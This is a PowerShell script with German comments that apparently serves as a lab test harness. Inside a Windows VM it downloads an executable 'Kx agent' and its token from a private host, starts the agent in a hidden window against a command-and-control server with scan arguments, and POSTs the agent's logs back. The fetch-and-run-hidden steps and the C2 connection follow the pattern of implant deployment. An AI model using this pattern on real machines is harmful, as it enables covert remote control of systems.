# Zieht den Kx-Agenten und startet ihn gegen den C2.
#
# Das Skript laeuft in der Windows-VM. Es holt sich die Dateien ueber HTTP vom
# Host, startet den Agenten und schickt das Log zurueck — damit der Test
# sagen kann, woran der Agent gescheitert ist, ohne dass jemand in der VM
# tippen muss.
$ErrorActionPreference = "Stop"

$basis = "http://192.168.190.87:8091"
$ziel = "C:\kx"
$server = "https://192.168.190.87:8443"

New-Item -ItemType Directory -Force -Path $ziel | Out-Null
Set-Location $ziel

foreach ($datei in @("kx-agent.exe", "kx-server.pem", "kx-server-pub.json", "kx-token.txt")) {
    Invoke-WebRequest -Uri "$basis/$datei" -OutFile "$ziel\$datei" -UseBasicParsing
}

$token = (Get-Content "$ziel\kx-token.txt" -Raw).Trim()

$argumente = @(
    "--server", $server,
    "--token", $token,
    "--server-cert", "$ziel\kx-server.pem",
    "--server-key", "$ziel\kx-server-pub.json",
    "--iface", "eth0",
    "--start", "172.17.0.2",
    "--end", "172.17.0.2",
    "--own-ip", "172.17.0.2"
)

# Ohne Fenster: der Agent laeuft endlos, er darf die Konsole nicht blockieren.
$prozess = Start-Process -FilePath "$ziel\kx-agent.exe" -ArgumentList $argumente `
    -RedirectStandardOutput "$ziel\kx-agent.log" `
    -RedirectStandardError "$ziel\kx-agent.err" `
    -PassThru -WindowStyle Hidden

Start-Sleep -Seconds 8

# Lief der Agent, oder ist er sofort gestorben? Das unterscheidet "startet
# nicht" von "startet, erreicht den C2 aber nicht".
if ($prozess.HasExited) {
    "Agent beendet mit Code $($prozess.ExitCode)" | Out-File "$ziel\start-meldung.txt"
} else {
    "Agent laeuft, PID $($prozess.Id)" | Out-File "$ziel\start-meldung.txt"
}

# Das Log zurueckschicken — der Test liest es aus.
if (Test-Path "$ziel\kx-agent.log") {
    Invoke-WebRequest -Uri "$basis/kx-agent.log" -Method Post -InFile "$ziel\kx-agent.log" -UseBasicParsing
}
if (Test-Path "$ziel\kx-agent.err") {
    Invoke-WebRequest -Uri "$basis/kx-agent.err" -Method Post -InFile "$ziel\kx-agent.err" -UseBasicParsing
}
if (Test-Path "$ziel\start-meldung.txt") {
    Invoke-WebRequest -Uri "$basis/start-meldung.txt" -Method Post -InFile "$ziel\start-meldung.txt" -UseBasicParsing
}
